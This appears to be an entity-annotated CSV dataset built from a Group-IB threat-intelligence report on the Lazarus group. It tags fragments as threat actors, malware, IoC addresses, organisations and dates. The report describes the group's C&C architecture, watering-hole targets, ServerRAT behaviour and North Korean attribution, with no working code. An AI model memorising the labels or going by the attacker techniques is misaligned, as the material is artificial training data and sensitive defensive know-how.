DocName,text,intent
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," 
ARISEN

ARCHITECTURE / TOOLS / ATTRIBUTION



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution2

INTRODUCTION

In ",O
Group-IB_Lazarus,February 2016,timestamp
Group-IB_Lazarus,", hackers reportedly attempted to steal approximately  
1 billion USD from the ",O
Group-IB_Lazarus,Central Bank of Bangladesh,org
Group-IB_Lazarus, through ,O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus,. In ,O
Group-IB_Lazarus,February 2017,timestamp
Group-IB_Lazarus,", several Polish ",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus," were compromised.

Security researchers analysed the malware code, chiefly using this to attribute 
activity to ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group. As tools are often reused by different groups, while 
helpful, malware analysis does not provide conclusive evidence of attribution.

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus, researchers investigating ,O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group collected a broad range 
of data, both technical and strategic, which places clear attribution on ",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,". The team detected and thoroughly analyzed multiple layers of C&C 
infrastructure used by ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," and have identified North Korean IP addresses 
from which the attacks were ultimately controlled. The following report is 
an overview of this group’s attack methodology for financial institutions, the 
malware employed and review of their targets.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution3

Through analysis of ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," activity, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," gained deep insight on a 
complex botnet infrastructure built by the hacker group to conduct their 
attacks. To mask malicious activity, the hackers used a three-layer architecture 
of compromised servers with SSL encrypted channels established between 
them. In addition to encrypted traffic, data sent through SSL channel was 
additionally encrypted.  The attackers achieved anonymity by employing a 
legitimate VPN client - ",O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus,". In some cases, they also used corporate 
web servers that were part of the attacked infrastructure. 

To control infected machines, the hackers employed multi-module tools, 
attempting to complicate malware analysis. That said, they managed to 
conduct several successful attacks without employing 0day exploits. ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," 
demonstrated a flexible approach to attacks by applying different hacking tools, 
which prevented their detection by endpoint security solutions.

 
 
 

According to our investigation of the ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," infrastructure, the threat actors 
connected to the end C&C layer (Layer3) from two North Korean IP addresses 
",O
Group-IB_Lazarus,210.52.109.22,ioc
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus,". The second IP-address relates to Potonggang 
District, perhaps coincidentally, where ",O
Group-IB_Lazarus,National Defence Commission,org
Group-IB_Lazarus,North Korea,O
Group-IB_Lazarus,"

Additional evidence was confirmed that ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," links to North Korean hackers 
by ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists through analysis of pubic sources. We found a news 
report from a South Korean ",O
Group-IB_Lazarus,Arirang,org
Group-IB_Lazarus," TV agency, dated ",O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus,", about an attack on 
South Korean television stations and ",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus, as part of ,O
Group-IB_Lazarus,DarkSeoul,threat_actor
Group-IB_Lazarus," operation.  This 
attack performed by North Korean hackers and was investigated by the ",O
Group-IB_Lazarus,South Korea’s National Police Agency,org
Group-IB_Lazarus,", who detected two IP addresses ",O
Group-IB_Lazarus,175.45.178.19,ioc
Group-IB_Lazarus," and 
",O
Group-IB_Lazarus,175.45.178.97,ioc
Group-IB_Lazarus,", used by hackers to control malware. Both IP addresses are in the 
same block of IP addresses the IP ",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus,", which was discovered by  
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists.

KEY  
FINDINGS

01

Unique tools  
and C&C infrastructure 

Links to  
",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,"

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 

",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus, is purportedly controlled by ,O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus,", a division of the 
",O
Group-IB_Lazarus,Reconnaissance General Bureau,org
Group-IB_Lazarus,", a ",O
Group-IB_Lazarus,North Korean intelligence agency,org
Group-IB_Lazarus,".  
",O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus," is responsible for conducting military cyber campaigns.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution4

",O
Group-IB_Lazarus,Since 2016,timestamp
Group-IB_Lazarus,", the hackers have tried to mask their activity by pretending to 
be Russian hackers. They added specific debugging symbols and strings 
containing Russian words to a new version of ",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus,", a 
module designed to proxy network traffic. To protect their executables, 
they used ",O
Group-IB_Lazarus,Enigma Protector,tool
Group-IB_Lazarus,", a commercial product, which was created by a 
Russian software developer. They also used exploits for ",O
Group-IB_Lazarus,Flash,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,SilverLight,software
Group-IB_Lazarus," 
from sets of exploits created by Russian-speaking hackers.

These masquerade techniques did initially mislead some researchers who 
conducted express analysis of malicious code. 
 
 
 
A state-sponsored hacker group ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," managed to gain fraudulent 
access to the ",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus, network of attacked ,O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus,". This is believed to be a 
growing trend: state-sponsored hackers are demonstrating an increased 
interest in conducting attacks on financial institutions, which are considered 
a component of the national critical infrastructure in some countries. At the 
moment, only a few similar incidents have been detected. For example, 
",O
Group-IB_Lazarus,IN 2010-2013,timestamp
Group-IB_Lazarus, the ,O
Group-IB_Lazarus,NSA,org
Group-IB_Lazarus, reportedly penetrated the ,O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus," banking network and 
monitored a number of ",O
Group-IB_Lazarus,Middle East,country
Group-IB_Lazarus, ,O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus,. In late ,O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus,", attacks on Ukrainian 
",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus," were conducted, allegedly as part of the ",O
Group-IB_Lazarus,BlackEnergy,malware
Group-IB_Lazarus," operation. 
However, researchers expect that the number of attacks on financial 
institutions by state-backed hackers may significantly increase in the future. 
 
 
 
The earliest indicator of compromise detected by ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus,  is dated ,O
Group-IB_Lazarus,March 2016,timestamp
Group-IB_Lazarus,. This was directly after the ,O
Group-IB_Lazarus,Central Bank of Bangladesh,org
Group-IB_Lazarus," incident, 
which took place in ",O
Group-IB_Lazarus,February 2016,timestamp
Group-IB_Lazarus,", where attackers attempted to steal $1 
billion USD. Only a spelling mistake in an online bank transfer instruction 
helped prevent them from stealing more than $81 million USD. Following 
this incident, the group modified its tactics and tools, adapting them to the 
changing environment and misleading researchers.

Through analysis of compromised networks, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," identified IP addresses 
of universities in the ",O
Group-IB_Lazarus,US,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Canada,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Great Britain,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,India,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Bulgaria,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Poland,country
Group-IB_Lazarus,", 
",O
Group-IB_Lazarus,Turkey,country
Group-IB_Lazarus,", pharmaceutical companies in ",O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,China,country
Group-IB_Lazarus,", as well as government 
subnets in various countries.

Emerging trend

Victims

Masquerading  
as Russian hackers 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution5

To infiltrate systems of their interest, ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus, conducted ,O
Group-IB_Lazarus,watering-hole,technique
Group-IB_Lazarus," attacks 
leveraging compromised resources often visited by their potential victims, 
such as websites of financial regulators and government agencies in several 
countries.   
 
Some of these resources are listed below: 

• knf.gov.pl — ",O
Group-IB_Lazarus,The Polish Financial Supervision Authority,org
Group-IB_Lazarus,"

• cnvb.gob.mx — ",O
Group-IB_Lazarus,National Banking and Securities Commission,org
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Mexico,country
Group-IB_Lazarus,"

• brou.com.uy —  ",O
Group-IB_Lazarus,Banco de la República Oriental del Uruguay,org
Group-IB_Lazarus,", a state-owned  
",O
Group-IB_Lazarus,bank,industry
Group-IB_Lazarus, in ,O
Group-IB_Lazarus,Uruguay,country
Group-IB_Lazarus,"

Through examination of a code on a web server with exploits, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists detected a list of 255 IP address ranges. That said, hackers 
infected only those users who visited the website from a computer within the 
specified IP range. Based on this list, researchers have compiled a map of the 
countries that were of interest to the attackers, which is presented below.

ATTACK 
PREPARATION AND 
IMPLEMENTATION

2.1  Infection  
of web resources

02 To conduct attacks, the criminals 
developed toolsets to control C&C 
servers and infected machines, built 
a three-layer C&C infrastructure, 
and compromised dozens of large 
web resources.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution6

To gain access to websites of ",O
Group-IB_Lazarus,financial,industry
Group-IB_Lazarus, regulators and ,O
Group-IB_Lazarus,bank,industry
Group-IB_Lazarus," local networks, 
hackers used known vulnerabilities in ",O
Group-IB_Lazarus,JBoss,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Liferay,software
Group-IB_Lazarus,". They compiled an 
exploit for ",O
Group-IB_Lazarus,SilverLight,software
Group-IB_Lazarus, ,O
Group-IB_Lazarus,CVE-2016-0034,O
Group-IB_Lazarus," (MS16-006) which earlier was included 
into ",O
Group-IB_Lazarus,RIG,malware
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Angler,malware
Group-IB_Lazarus," exploit kits, they also used ",O
Group-IB_Lazarus,Flash exploits,malware
Group-IB_Lazarus, from ,O
Group-IB_Lazarus,Neutrino Exploit Kit,malware
Group-IB_Lazarus,".

 
 
 
 
Attackers created a 3-tier infrastructure that consisted of compromised 
servers, between which the hackers established SSL encrypted channels. The 
network interaction with the attacked computer was carried out only from the 
Layer 1 server, which acted as a C&C server. In some cases, hackers placed the 
Layer 1 server inside the organization attacked in order to reduce the risk of 
detection. They gained access to these servers by brute forcing passwords for 
RDP. 

Hackers used original set of tools:

 
Through in-depth analysis of the tools used by the attackers, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," 
specialists identified the scheme of communications between nodes within 
the C&C infrastructure.

2.2  Establishment of C&C 
infrastructure:  

",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," Used to manage windows-based server infrastructure

Server_TrafficForwarder Forwards traffic from one external server to another  

Backend_ Listener Establishes connection with servers with installed Server_
RAT, gets commands directly from the threat actor

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," Admin tool to send commands to infected computers

",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus, toolbox Used to work with ,O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus,", consists of Alliance software 
Hook Files and ",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus," transactions Information 
Harvester.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution7

",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," was installed on all infrastructure levels to control the 
compromised infrastructure 
 
",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," constantly listens on port 3365, to which attackers connected 
to control the server. To ensure the availability of the specified port, 
the malicious program added a special rule to the firewall that allowed 
incoming connections to this port. Infected computers performed an 
outgoing connection to the compromised server acting as proxy via port 
443. Typically outbound connections on this port are allowed in corporate 
networks.

Based on analysis of the ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," functionality, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists 
identified that ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," responds to certain requests in a specific way. 
Keeping in mind that ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," constantly keeps port 3365 open, we 
scanned the Internet for open ports 3365. Following this, we checked a 
list of detected servers to identify those servers where ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," was 
installed. As a result, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists received a list of 74 IP addresses, 
which are presented in the Indicators of Compromise section.

Server_TrafficForwarder was installed on the first and second server level 
— this module redirected traffic from one server to another.  
 
In some cases, Server_TrafficForwarder was installed on servers inside the 
attacked organization. This approach allows the criminal to avoid detection 
of suspicious connections to the external network or bypass network 
connection restrictions with prohibited connections to the external network 
from specific computers/servers, which is often applied by companies to 
protect the most critical PCs, such as those of ",O
Group-IB_Lazarus,SWIFT,software
Group-IB_Lazarus," operators. 

Three-layer C&C server infrastructure

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
